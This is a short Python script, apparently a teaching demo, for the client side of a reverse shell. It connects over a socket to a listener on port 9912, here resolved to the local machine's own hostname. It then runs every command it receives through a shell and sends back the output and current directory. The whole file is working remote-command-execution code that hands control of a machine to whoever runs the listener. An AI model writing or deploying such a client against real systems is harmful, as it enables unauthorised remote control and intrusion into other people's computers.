#the Client program for the demonstration of Reverse Shell
import socket
import sys
import subprocess
#The library provides interfaces to communicate with the shell,directory functionalities etc !
import os
try:
	soc=socket.socket()
	soc.connect((socket.gethostbyname(socket.gethostname()),9912))
	print('Ready to Chat !')
	cmd=''
	while True:
		#decode the bytes to str
		data=soc.recv(1024).decode()
		if data.lower()=='quit':
			soc.close()
			break
		if data[:2]=='cd':
			#if we have detected a cd command 
			os.chdir(data[3:])
		#the conditional for other processes
		if len(data.encode())>0:
			#Opening the Command Line Shell
			#this will execute a child program in a new process
			cmd=subprocess.Popen(data[:],shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
			output_bytes=cmd.stdout.read()
			output_string=output_bytes.decode()
			soc.send((output_string+str(os.getcwd())+'>>').encode())
			print(output_string)
except socket.error as s_r:
	print('The socket ha met with some error :',str(s_r))
	print('Client Socket is Closing...')
